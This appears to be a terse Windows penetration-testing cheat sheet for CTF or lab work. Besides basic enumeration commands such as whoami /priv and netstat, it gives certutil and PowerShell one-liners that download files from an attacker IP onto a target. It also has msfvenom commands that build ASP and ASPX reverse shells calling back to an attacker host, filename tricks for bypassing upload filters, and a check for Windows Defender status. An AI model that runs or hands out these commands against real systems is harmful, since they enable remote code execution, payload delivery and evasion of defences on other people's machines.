OS architecture 

- powershell

```powershell
# https://docs.microsoft.com/en-us/dotnet/api/system.environment.is64bitoperatingsystem?view=net-6.0
[System.Environment]::Is64BitOperatingSystem
# without .Net
(gwmi Win32_OperatingSystem).OSArchitecture -eq '64-bit'
```

- cmd

```cmd
(wmic os get osarchitecture)
```

AppData's Temp folder (%TEMP%)

```cmd
C:\Users\<User Account>\AppData\Local\Temp
C:\Windows\Temp
```

[displays file ownership information](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dir)

```cmd
dir /q /a
```

privileges information

```cmd
whoami /priv
whoami /all
```

check network connections 

```cmd
netstat -ano | findstr LISTEN
```

file transfer

```cmd
# on target 
certutil -urlcache -split -f "http://<target ip>/<file>" "C:\Users\<User Account>\Desktop\<file>"
PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
```

checking if Windows Defender is active

```powershell
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
```

ASP & ASPX reverse shell

```shell
# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f asp -o rev.asp
# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f aspx -o rev.aspx
# file upload bypass
#   try filename "rev.aspx..... .. . . ."
#   try filename "rev.aspx.png"
#   try web.config (File_Upload_Bypass.md)
```
